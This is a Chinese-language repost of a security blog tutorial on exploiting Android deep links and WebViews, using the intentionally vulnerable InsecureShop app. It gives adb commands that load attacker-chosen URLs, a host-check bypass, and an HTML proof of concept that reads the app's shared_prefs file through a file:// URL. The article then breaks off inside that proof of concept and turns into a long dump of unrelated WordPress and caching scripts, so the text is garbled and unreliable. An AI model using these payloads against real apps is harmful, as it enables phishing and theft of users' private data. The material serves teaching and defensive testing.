#  Android Deep Link 问题和 WebView 漏洞利用   
8ksec  Ots安全   2024-05-12 12:10  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
在过去的几年里，Android 智能手机已经变得无处不在。我们有数百万用户依靠这些设备进行商务和个人通信、娱乐和工作。随着 Android 智能手机使用量的增加，应用程序中的安全漏洞数量大幅增加，这些漏洞可能使用户的个人数据面临风险。  
  
Android 深度链接和 Android 应用程序中 WebView 的使用是最具针对性但最少被提及的攻击媒介之一。在这篇博文中，我们将深入探讨这些问题，并为您提供利用和防御此类攻击的技术。  
  
**什么是 Android 深层链接？**  
  
Android 深层链接是一种将用户引导至应用程序中特定内容的方法，无论他们的设备上是否安装了该应用程序。深层链接可用于各种场景，例如通过消息或电子邮件与朋友共享应用程序中的特定页面或产品。  
  
深层链接通过利用与应用程序中的特定内容片段链接的不同 URL 来发挥作用。单击深层链接 URL 后，用户的设备将验证应用程序是否已安装。如果是这样，应用程序将自动打开并将用户直接导航到深层链接中标识的指定内容。如果未安装该应用程序，用户将被重定向到 Google Play 商店或其他应用程序商店中的应用程序页面，系统将提示用户下载并安装该应用程序。  
  
我们看到的深层链接通常有两种类型：  
  
(i) 隐式深层链接 – 这些深层链接将用户带到应用程序内任何特定部分的静态位置，而无需指定要调用的确切组件。示例：应用程序小部件或通知等  
  
下面是 Java 中隐式深层链接的示例：  
  
```
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("pepper://open/product?id=1234"));
startActivity(intent);
```  
  
  
在此代码片段中，当用户单击具有此 URI 方案的链接时，Android 应用程序将接收意图并使用 id 参数来确定应向用户显示什么产品。将向用户呈现的确切活动将由应用程序的内部逻辑确定，该内部逻辑可以进一步基于 URI 参数、设备首选项或其他因素。  
  
(ii) 显式深层链接 – 这些深层链接通常采用 URI 形式，可将您带到直接存在于任何其他应用程序中的活动。它可用于启动特定组件，例如同一应用程序或另一个应用程序中的活动、服务或广播接收器。示例：当单击 Play 商店的移动网络浏览器上的条款和条件页面时，您将进入 Play 商店移动应用程序中的条款和条件活动。  
  
 下面是 Java 中显式深层链接的示例：  
  
```
Intent intent = new Intent(this, ProductActivity.class);
intent.setData(Uri.parse("pepper://product?id=12345"));
startActivity(intent);
```  
  
  
此代码片段将打开 Pepper 应用程序（如果已安装）并导航到 ID 为 12345 的产品。如果未安装该应用程序，则会将用户重定向到应用程序商店中该应用程序的页面。  
  
然而，值得注意的是，开发人员经常将这些深层链接暴露给攻击者。例如，HackerOne 上报告了通过深层链接漏洞进行帐户接管的事件，网址为 https://hackerone.com/reports/855618  ，报告了通过深层链接漏洞泄露敏感信息的事件，网址为 https://hackerone.com/reports/401793  
  
**如何识别 Android 应用程序中的深层链接？**  
  
深层链接的声明：  
  
```
<activity
   android:name="com.8ksec.android.MainActivity"
   android:label="@string/title_example" >
   <intent-filter android:label="@string/filter_view_http_example">
       <action android:name="android.intent.action.VIEW" />
       <category android:name="android.intent.category.DEFAULT" />
       <category android:name="android.intent.category.BROWSABLE" />
       <data android:scheme="https"
             android:host="www.8ksec.io"
             android:pathPrefix="/training" />
   </intent-filter>
   <intent-filter android:label="@string/filter_view_example_example">
       <action android:name="android.intent.action.VIEW" />
       <category android:name="android.intent.category.DEFAULT" />
       <category android:name="android.intent.category.BROWSABLE" />
             <data android:scheme="8ksec"
             android:host="training" />
   </intent-filter>
</activity>
```  
  
  
上面的代码片段可以帮助解释典型的深层链接声明在应用程序中的样子。从上面的代码中，我们可以理解两种类型的URL schema  
  
https://www.8ksec.io/training  
- HTTPS – 用于访问链接的协议  
  
- www.8ksec.io  – 这是域名  
  
- /training – 这是将我们带到应用程序中特定活动的路径  
  
8ksec://训练  
- 这是我们设置的自定义深层链接，这也将带我们到必须声明为 android 清单 XML 的 MainActivity。  
  
到目前为止的内容应该已经基本介绍了什么是深层链接，以及如何在应用程序中识别它。  
  
这是一个供读者练习的练习：有一个游戏应用程序具有下面提到的深层链接声明：  
  
```
mario://level/99
```  
  
  
你看到这里有什么问题吗？评论此博客让我们知道！  
  
**如何在 Android 应用程序中利用 Android 深层链接？**  
  
工具：  
- APKTOOL –  https://ibotpeaches.github.io/Apktool/  
  
- Get_schemas –  https://github.com/teknogeek/get_schemas  
  
易受攻击的应用程序：  
- InsecureShop –  https://github.com/hax0rgb/InsecureShop  
  
本博客讨论与 InsecureShop 应用程序中存在的深层链接相关的所有问题。请查看https://github.com/hax0rgb/InsecureShop以了解有关这个出色项目的更多信息！  
  
**场景 1：URL 验证不充分**  
  
大多数移动应用程序都提供在应用程序内加载 Web 视图的功能。这可以像网站上的条款和条件页面一样简单，也可以像优惠券等附加功能一样。在本节中，我们将研究如何利用 insecureshop 应用程序中不进行任何类型验证的深层链接在它加载的 URL 上。  
  
我们使用 apktool 获取 AndroidManifest.xml 文件并查看 InsecureShop 中的活动。  
  
我们可以使用上一节中收集的知识来识别此应用程序中的深层链接。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafCAzIfQDXl0xbqot42Df11nIVicJTzqOz31FhxYWksbx5tJvjOiaTRPFwPmBmRK0erOALqwLn1hkHw/640?wx_fmt=png&from=appmsg "")  
  
这里的深层链接将是 insecureshop://com.insecureshop/  
  
我们还可以使用 https://github.com/teknogeek/get_schemas来获取模式  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tafCAzIfQDXl0xbqot42Df11WeNBlic7icblcoepsUPnic43QmCE9XTHsV5HQH9AanXPZR2Um65CWQ7kg/640?wx_fmt=jpeg&from=appmsg "")  
  
WebView 对应的 java 代码是：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafCAzIfQDXl0xbqot42Df11QEyBKOu7ajhuHdlhXZBRdeDFGSmqO7Tic68ibFjgwspGU6WUUXOWYbtQ/640?wx_fmt=png&from=appmsg "")  
  
在这里我们可以看到，这个特定的 WebView 模式将端点作为“/web”，之后添加了名为“url”的深层链接模式的意图，并通过“webview.loadUrl(”进一步加载到 WebView 中)数据）”。  
  
这里的模式是：  
```
insecureshop://com.insecureshop/web?url.
```  
  
现在为了触发这个深层链接，我们可以使用android文档中的参考 https://developer.android.com/training/app-links/deep-linking#testing-filters 在这里我们可以看到命令是：  
```
adb shell am start -W -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/web?url=https://8ksec.com"
```  
  
这将加载 8kSec 网页。攻击者可以使用相同的方法加载网络钓鱼页面来瞄准毫无戒心的受害者。  
  
缓解措施：为了确保在移动应用程序中安全加载网页内容，验证 URL 及其来源非常重要。仅允许属于移动应用程序访问的域的网页内容。  
  
**场景 2：主机验证较弱**  
  
移动应用程序可能需要在 Web 视图中加载内容，例如通过 SDK 处理付款或在应用程序中购买积分时重定向到条款和条件页面。但是，验证 Web 视图中呈现的 URL 以防止潜在的安全风险非常重要。如果存在缺陷，攻击者可以通过在其他安全的 Web 视图中加载恶意网页来利用它。我们使用 apktool 获取 AndroidManifest.xml 文件并查看 InsecureShop 应用程序中的活动。正如我们从前面的示例中了解到如何识别深层链接。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafCAzIfQDXl0xbqot42Df117f0gXpTogGvMWsiaPHaehaiby9A8kzyFxyZ2n4QfXIuvD5hXqSjzfkdw/640?wx_fmt=png&from=appmsg "")  
  
WebView 对应的 java 代码是：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafCAzIfQDXl0xbqot42Df11Iu85ezVymjbdr6Ter4Snu593Tvibdicaw5Kg20v4UlMCPQRSFrGxz8lw/640?wx_fmt=png&from=appmsg "")  
  
我们可以观察到端点现在已更新为 /webview，而架构仍与场景 1 中相同。但是，添加了一个验证步骤，用于检查 URL 参数中指定的域是否以“insecureshop.com”结尾。这里的模式是：  
```
insecureshop://com.insecureshop/webview?url.
```  
  
触发 WebView 时，我们可以使用以下命令：  
```
adb shell am start -W -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/webview?url=ksec7.wpcomstaging.com/?insecureshopapp.com"
```  
  
更好的方法是使用以下组合来绕过验证：  
```
adb shell am start -W -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/webview?url=ksec7.wpcomstaging.com/training/?superimportantlinkopen=insecureshopapp.com
```  
  
然后，您可以看到加载了 8ksec 网页，而不是原始的 insecureshopapp.com，因为代码仅检查以 insecureshopapp.com 结尾的内容 url，而不是完整的架构。  
  
减轻：  
- 确保验证权限，而不仅仅是 URL 结尾的域名。  
  
- 在 API 级别 1-24（最高 Android 7.0）的设备上，android.net.Uri 和 java.net.URL 解析器无法正常工作。示例：  String url = “<8ksec.io\\\\\\\\@insecureshopapp.com>”；这将加载 io 网页。如果请求中遇到黑斜杠，请确保抛出 URISyntaxException。  
  
**场景 3：WebView 漏洞利用**  
  
在这里，我们将探索 InsecureShop 应用程序中与 WebView 相关的漏洞。这里的目的是利用 WebView 的不安全实现并泄露存储在受害设备上的应用程序沙箱内的敏感信息。  
  
为了识别 webview 及其在代码库中的用法，我们需要开始查找具有 Android API  setJavaScriptEnabled(true) 的活动；宣布。  
  
我们使用 Jadx 搜索来查找它所在的实例。这些是我们需要执行我们可以控制的 Javascript 的活动，它将在 insecureShop 应用程序的上下文中触发。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafCAzIfQDXl0xbqot42Df111lTqUmibeh7037pniaiae9me0icaqNQF5GqTTUyjsWAOTYgnVibzNGZziaRQ/640?wx_fmt=png&from=appmsg "")  
  
我们已经确定了需要执行操作的活动，现在我们需要找到允许我们访问应用程序沙箱中的数据的 API。幸运的是，我们熟悉可用于数据泄露的 Android API。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafCAzIfQDXl0xbqot42Df11IpGc7j4AURT6Liaw2gztEcWxoZIUhmIuh3GxSpSuwyQgu33NMWH9n2g/640?wx_fmt=png&from=appmsg "")  
  
现在我们知道了对 API  getAllowUniversalAccessFromFileURLs的所有调用。这个 API 将帮助我们从应用程序沙箱中窃取数据。  
  
有两种可能的方法来加载 URI 并获取数据，我们甚至可以从受害者的设备中窃取数据。我们将详细研究它们中的每一个。  
  
这可以只是一个简单的 poc，就像我们可以在其中设置 html 页面一样。  
```
<html>
  <body>
      <h2>
        <a href="insecureshop://com.insecureshop/web?url=file:///data/data/com.insecureshop/shared_prefs/Prefs.xml">Just click here</a>
      </h2>
    <script>if(navigator.userAgent.match(/MSIE|Internet Explorer/i)||navigator.userAgent.match(/Trident\/7\..*?rv:11/i)){var href=document.location.href;if(!href.match(/[?&]nowprocket/)){if(href.indexOf("?")==-1){if(href.indexOf("#")==-1){document.location.href=href+"?nowprocket=1"}else{document.location.href=href.replace("#","?nowprocket=1#")}}else{if(href.indexOf("#")==-1){document.location.href=href+"&nowprocket=1"}else{document.location.href=href.replace("#","&nowprocket=1#")}}}}</script><script>class RocketLazyLoadScripts{constructor(){this.v="1.2.3",this.triggerEvents=["keydown","mousedown","mousemove","touchmove","touchstart","touchend","wheel"],this.userEventHandler=this._triggerListener.bind(this),this.touchStartHandler=this._onTouchStart.bind(this),this.touchMoveHandler=this._onTouchMove.bind(this),this.touchEndHandler=this._onTouchEnd.bind(this),this.clickHandler=this._onClick.bind(this),this.interceptedClicks=[],window.addEventListener("pageshow",t=>{this.persisted=t.persisted}),window.addEventListener("DOMContentLoaded",()=>{this._preconnect3rdParties()}),this.delayedScripts={normal:[],async:[],defer:[]},this.trash=[],this.allJQueries=[]}_addUserInteractionListener(t){if(document.hidden){t._triggerListener();return}this.triggerEvents.forEach(e=>window.addEventListener(e,t.userEventHandler,{passive:!0})),window.addEventListener("touchstart",t.touchStartHandler,{passive:!0}),window.addEventListener("mousedown",t.touchStartHandler),document.addEventListener("visibilitychange",t.userEventHandler)}_removeUserInteractionListener(){this.triggerEvents.forEach(t=>window.removeEventListener(t,this.userEventHandler,{passive:!0})),document.removeEventListener("visibilitychange",this.userEventHandler)}_onTouchStart(t){"HTML"!==t.target.tagName&&(window.addEventListener("touchend",this.touchEndHandler),window.addEventListener("mouseup",this.touchEndHandler),window.addEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.addEventListener("mousemove",this.touchMoveHandler),t.target.addEventListener("click",this.clickHandler),this._renameDOMAttribute(t.target,"onclick","rocket-onclick"),this._pendingClickStarted())}_onTouchMove(t){window.removeEventListener("touchend",this.touchEndHandler),window.removeEventListener("mouseup",this.touchEndHandler),window.removeEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.removeEventListener("mousemove",this.touchMoveHandler),t.target.removeEventListener("click",this.clickHandler),this._renameDOMAttribute(t.target,"rocket-onclick","onclick"),this._pendingClickFinished()}_onTouchEnd(t){window.removeEventListener("touchend",this.touchEndHandler),window.removeEventListener("mouseup",this.touchEndHandler),window.removeEventListener("touchmove",this.touchMoveHandler,{passive:!0}),window.removeEventListener("mousemove",this.touchMoveHandler)}_onClick(t){t.target.removeEventListener("click",this.clickHandler),this._renameDOMAttribute(t.target,"rocket-onclick","onclick"),this.interceptedClicks.push(t),t.preventDefault(),t.stopPropagation(),t.stopImmediatePropagation(),this._pendingClickFinished()}_replayClicks(){window.removeEventListener("touchstart",this.touchStartHandler,{passive:!0}),window.removeEventListener("mousedown",this.touchStartHandler),this.interceptedClicks.forEach(t=>{t.target.dispatchEvent(new MouseEvent("click",{view:t.view,bubbles:!0,cancelable:!0}))})}_waitForPendingClicks(){return new Promise(t=>{this._isClickPending?this._pendingClickFinished=t:t()})}_pendingClickStarted(){this._isClickPending=!0}_pendingClickFinished(){this._isClickPending=!1}_renameDOMAttribute(t,e,r){t.hasAttribute&&t.hasAttribute(e)&&(event.target.setAttribute(r,event.target.getAttribute(e)),event.target.removeAttribute(e))}_triggerListener(){this._removeUserInteractionListener(this),"loading"===document.readyState?document.addEventListener("DOMContentLoaded",this._loadEverythingNow.bind(this)):this._loadEverythingNow()}_preconnect3rdParties(){let t=[];document.querySelectorAll("script[type=rocketlazyloadscript]").forEach(e=>{if(e.hasAttribute("src")){let r=new URL(e.src).origin;r!==location.origin&&t.push({src:r,crossOrigin:e.crossOrigin||"module"===e.getAttribute("data-rocket-type")})}}),t=[...new Map(t.map(t=>[JSON.stringify(t),t])).values()],this._batchInjectResourceHints(t,"preconnect")}async _loadEverythingNow(){this.lastBreath=Date.now(),this._delayEventListeners(this),this._delayJQueryReady(this),this._handleDocumentWrite(),this._registerAllDelayedScripts(),this._preloadAllScripts(),await this._loadScriptsFromList(this.delayedScripts.normal),await this._loadScriptsFromList(this.delayedScripts.defer),await this._loadScriptsFromList(this.delayedScripts.async);try{await this._triggerDOMContentLoaded(),await this._triggerWindowLoad()}catch(t){console.error(t)}window.dispatchEvent(new Event("rocket-allScriptsLoaded")),this._waitForPendingClicks().then(()=>{this._replayClicks()}),this._emptyTrash()}_registerAllDelayedScripts(){document.querySelectorAll("script[type=rocketlazyloadscript]").forEach(t=>{t.hasAttribute("data-rocket-src")?t.hasAttribute("async")&&!1!==t.async?this.delayedScripts.async.push(t):t.hasAttribute("defer")&&!1!==t.defer||"module"===t.getAttribute("data-rocket-type")?this.delayedScripts.defer.push(t):this.delayedScripts.normal.push(t):this.delayedScripts.normal.push(t)})}async _transformScript(t){return new Promise((await this._littleBreath(),navigator.userAgent.indexOf("Firefox/")>0||""===navigator.vendor)?e=>{let r=document.createElement("script");[...t.attributes].forEach(t=>{let e=t.nodeName;"type"!==e&&("data-rocket-type"===e&&(e="type"),"data-rocket-src"===e&&(e="src"),r.setAttribute(e,t.nodeValue))}),t.text&&(r.text=t.text),r.hasAttribute("src")?(r.addEventListener("load",e),r.addEventListener("error",e)):(r.text=t.text,e());try{t.parentNode.replaceChild(r,t)}catch(i){e()}}:async e=>{function r(){t.setAttribute("data-rocket-status","failed"),e()}try{let i=t.getAttribute("data-rocket-type"),n=t.getAttribute("data-rocket-src");t.text,i?(t.type=i,t.removeAttribute("data-rocket-type")):t.removeAttribute("type"),t.addEventListener("load",function r(){t.setAttribute("data-rocket-status","executed"),e()}),t.addEventListener("error",r),n?(t.removeAttribute("data-rocket-src"),t.src=n):t.src="data:text/javascript;base64,"+window.btoa(unescape(encodeURIComponent(t.text)))}catch(s){r()}})}async _loadScriptsFromList(t){let e=t.shift();return e&&e.isConnected?(await this._transformScript(e),this._loadScriptsFromList(t)):Promise.resolve()}_preloadAllScripts(){this._batchInjectResourceHints([...this.delayedScripts.normal,...this.delayedScripts.defer,...this.delayedScripts.async],"preload")}_batchInjectResourceHints(t,e){var r=document.createDocumentFragment();t.forEach(t=>{let i=t.getAttribute&&t.getAttribute("data-rocket-src")||t.src;if(i){let n=document.createElement("link");n.href=i,n.rel=e,"preconnect"!==e&&(n.as="script"),t.getAttribute&&"module"===t.getAttribute("data-rocket-type")&&(n.crossOrigin=!0),t.crossOrigin&&(n.crossOrigin=t.crossOrigin),t.integrity&&(n.integrity=t.integrity),r.appendChild(n),this.trash.push(n)}}),document.head.appendChild(r)}_delayEventListeners(t){let e={};function r(t,r){!function t(r){!e[r]&&(e[r]={originalFunctions:{add:r.addEventListener,remove:r.removeEventListener},eventsToRewrite:[]},r.addEventListener=function(){arguments[0]=i(arguments[0]),e[r].originalFunctions.add.apply(r,arguments)},r.removeEventListener=function(){arguments[0]=i(arguments[0]),e[r].originalFunctions.remove.apply(r,arguments)});function i(t){return e[r].eventsToRewrite.indexOf(t)>=0?"rocket-"+t:t}}(t),e[t].eventsToRewrite.push(r)}function i(t,e){let r=t[e];Object.defineProperty(t,e,{get:()=>r||function(){},set(i){t["rocket"+e]=r=i}})}r(document,"DOMContentLoaded"),r(window,"DOMContentLoaded"),r(window,"load"),r(window,"pageshow"),r(document,"readystatechange"),i(document,"onreadystatechange"),i(window,"onload"),i(window,"onpageshow")}_delayJQueryReady(t){let e;function r(r){if(r&&r.fn&&!t.allJQueries.includes(r)){r.fn.ready=r.fn.init.prototype.ready=function(e){return t.domReadyFired?e.bind(document)(r):document.addEventListener("rocket-DOMContentLoaded",()=>e.bind(document)(r)),r([])};let i=r.fn.on;r.fn.on=r.fn.init.prototype.on=function(){if(this[0]===window){function t(t){return t.split(" ").map(t=>"load"===t||0===t.indexOf("load.")?"rocket-jquery-load":t).join(" ")}"string"==typeof arguments[0]||arguments[0]instanceof String?arguments[0]=t(arguments[0]):"object"==typeof arguments[0]&&Object.keys(arguments[0]).forEach(e=>{let r=arguments[0][e];delete arguments[0][e],arguments[0][t(e)]=r})}return i.apply(this,arguments),this},t.allJQueries.push(r)}e=r}r(window.jQuery),Object.defineProperty(window,"jQuery",{get:()=>e,set(t){r(t)}})}async _triggerDOMContentLoaded(){this.domReadyFired=!0,await this._littleBreath(),document.dispatchEvent(new Event("rocket-DOMContentLoaded")),await this._littleBreath(),window.dispatchEvent(new Event("rocket-DOMContentLoaded")),await this._littleBreath(),document.dispatchEvent(new Event("rocket-readystatechange")),await this._littleBreath(),document.rocketonreadystatechange&&document.rocketonreadystatechange()}async _triggerWindowLoad(){await this._littleBreath(),window.dispatchEvent(new Event("rocket-load")),await this._littleBreath(),window.rocketonload&&window.rocketonload(),await this._littleBreath(),this.allJQueries.forEach(t=>t(window).trigger("rocket-jquery-load")),await this._littleBreath();let t=new Event("rocket-pageshow");t.persisted=this.persisted,window.dispatchEvent(t),await this._littleBreath(),window.rocketonpageshow&&window.rocketonpageshow({persisted:this.persisted})}_handleDocumentWrite(){let t=new Map;document.write=document.writeln=function(e){let r=document.currentScript;r||console.error("WPRocket unable to document.write this: "+e);let i=document.createRange(),n=r.parentElement,s=t.get(r);void 0===s&&(s=r.nextSibling,t.set(r,s));let a=document.createDocumentFragment();i.setStart(a,0),a.appendChild(i.createContextualFragment(e)),n.insertBefore(a,s)}}async _littleBreath(){Date.now()-this.lastBreath>45&&(await this._requestAnimFrame(),this.lastBreath=Date.now())}async _requestAnimFrame(){return document.hidden?new Promise(t=>setTimeout(t)):new Promise(t=>requestAnimationFrame(t))}_emptyTrash(){this.trash.forEach(t=>t.remove())}static run(){let t=new RocketLazyLoadScripts;t._addUserInteractionListener(t)}}RocketLazyLoadScripts.run();</script><script type="rocketlazyloadscript">
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/8ksec.io\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.5.3"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
</script><script src="https://8ksec.io/wp-content/plugins/jquery-updater/js/jquery-3.7.1.min.js?ver=3.7.1" id="jquery-core-js" defer></script><script type="rocketlazyloadscript" data-rocket-type='text/javascript' data-rocket-src='https://8ksec.io/_jb_static/??-eJx9zkEOwiAQBdDbuBIIaWvjovEsQMc6BCgyUOLtpdGYGBOX8//Py9TIzBoyhCyiKwsGEvZeID1YibPKkIT9JB6X1CLW8Z5L7jFwS8f6C4AD324Mm5obEIt2aHbnu2Cv4j+yJqGIIJNwqMW1jZiqQKuHHdx6Rjf09H7m4ic5ykGeunE4H4ye5BMJHFI2' defer></script><script type="rocketlazyloadscript" class="hsq-set-content-id" data-content-id="blog-post">
        var _hsq = _hsq || [];
        _hsq.push(["setContentType", "blog-post"]);
</script><script type="application/javascript">const rocket_pairs = [{"selector":".rll-youtube-player .play","style":":root{--wpr-bg-4e19fb5d-5eeb-41f6-8a91-aafbad3346f1: url('https:\/\/8ksec.io\/wp-content\/plugins\/wp-rocket\/assets\/img\/youtube.png');}","hash":"4e19fb5d-5eeb-41f6-8a91-aafbad3346f1"},{"selector":".rll-youtube-player .play","style":":root{--wpr-bg-56049537-b1e7-4386-957e-f55c7494936b: url('https:\/\/8ksec.io\/wp-content\/plugins\/wp-rocket\/assets\/img\/youtube.png');}","hash":"56049537-b1e7-4386-957e-f55c7494936b"}];</script><script>class RocketElementorAnimation{constructor(){this.deviceMode=document.createElement("span"),this.deviceMode.id="elementor-device-mode-wpr",this.deviceMode.setAttribute("class","elementor-screen-only"),document.body.appendChild(this.deviceMode)}_detectAnimations(){let t=getComputedStyle(this.deviceMode,":after").content.replace(/"/g,"");this.animationSettingKeys=this._listAnimationSettingsKeys(t),document.querySelectorAll(".elementor-invisible[data-settings]").forEach(t=>{const e=t.getBoundingClientRect();if(e.bottom>=0&&e.top<=window.innerHeight)try{this._animateElement(t)}catch(t){}})}_animateElement(t){const e=JSON.parse(t.dataset.settings),i=e._animation_delay||e.animation_delay||0,n=e[this.animationSettingKeys.find(t=>e[t])];if("none"===n)return void t.classList.remove("elementor-invisible");t.classList.remove(n),this.currentAnimation&&t.classList.remove(this.currentAnimation),this.currentAnimation=n;let s=setTimeout(()=>{t.classList.remove("elementor-invisible"),t.classList.add("animated",n),this._removeAnimationSettings(t,e)},i);window.addEventListener("rocket-startLoading",function(){clearTimeout(s)})}_listAnimationSettingsKeys(t="mobile"){const e=[""];switch(t){case"mobile":e.unshift("_mobile");case"tablet":e.unshift("_tablet");case"desktop":e.unshift("_desktop")}const i=[];return["animation","_animation"].forEach(t=>{e.forEach(e=>{i.push(t+e)})}),i}_removeAnimationSettings(t,e){this._listAnimationSettingsKeys().forEach(t=>delete e[t]),t.dataset.settings=JSON.stringify(e)}static run(){const t=new RocketElementorAnimation;requestAnimationFrame(t._detectAnimations.bind(t))}}document.addEventListener("DOMContentLoaded",RocketElementorAnimation.run);</script><script type="application/javascript">const rocket_pairs = [{"selector":".rll-youtube-player .play","style":":root{--wpr-bg-4e19fb5d-5eeb-41f6-8a91-aafbad3346f1: url('https:\/\/8ksec.io\/wp-content\/plugins\/wp-rocket\/assets\/img\/youtube.png');}","hash":"4e19fb5d-5eeb-41f6-8a91-aafbad3346f1"},{"selector":".rll-youtube-player .play","style":":root{--wpr-bg-56049537-b1e7-4386-957e-f55c7494936b: url('https:\/\/8ksec.io\/wp-content\/plugins\/wp-rocket\/assets\/img\/youtube.png');}","hash":"56049537-b1e7-4386-957e-f55c7494936b"}];</script><script type="rocketlazyloadscript" defer id="bilmur" data-provider="wordpress.com" data-service="atomic"  data-rocket-src="https://s0.wp.com/wp-content/js/bilmur.min.js?m=202419"></script><script>window.addEventListener( 'load', function() {
        document.querySelectorAll( 'link' ).forEach( function( e ) {'not all' === e.media && e.dataset.media && ( e.media = e.dataset.media, delete e.dataset.media );} );
        var e = document.getElementById( 'jetpack-boost-critical-css' );
        e && ( e.media = 'not all' );
      } );</script><script id="leadin-script-loader-js-js-extra">
var leadin_wordpress = {"userRole":"visitor","pageType":"post","leadinPluginVersion":"11.1.6"};
</script><script type="rocketlazyloadscript" data-minify="1" data-rocket-src="https://8ksec.io/wp-content/cache/min/1/23795731.js?ver=1715117488" id="leadin-script-loader-js-js" defer></script><script type="rocketlazyloadscript" id="rocket-browser-checker-js-after">
"use strict";var _createClass=function(){function defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,descriptor.key,descriptor)}}return function(Constructor,protoProps,staticProps){return protoProps&&defineProperties(Constructor.prototype,protoProps),staticProps&&defineProperties(Constructor,staticProps),Constructor}}();function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}var RocketBrowserCompatibilityChecker=function(){function RocketBrowserCompatibilityChecker(options){_classCallCheck(this,RocketBrowserCompatibilityChecker),this.passiveSupported=!1,this._checkPassiveOption(this),this.options=!!this.passiveSupported&&options}return _createClass(RocketBrowserCompatibilityChecker,[{key:"_checkPassiveOption",value:function(self){try{var options={get passive(){return!(self.passiveSupported=!0)}};window.addEventListener("test",null,options),window.removeEventListener("test",null,options)}catch(err){self.passiveSupported=!1}}},{key:"initRequestIdleCallback",value:function(){!1 in window&&(window.requestIdleCallback=function(cb){var start=Date.now();return setTimeout(function(){cb({didTimeout:!1,timeRemaining:function(){return Math.max(0,50-(Date.now()-start))}})},1)}),!1 in window&&(window.cancelIdleCallback=function(id){return clearTimeout(id)})}},{key:"isDataSaverModeOn",value:function(){return"connection"in navigator&&!0===navigator.connection.saveData}},{key:"supportsLinkPrefetch",value:function(){var elem=document.createElement("link");return elem.relList&&elem.relList.supports&&elem.relList.supports("prefetch")&&window.IntersectionObserver&&"isIntersecting"in 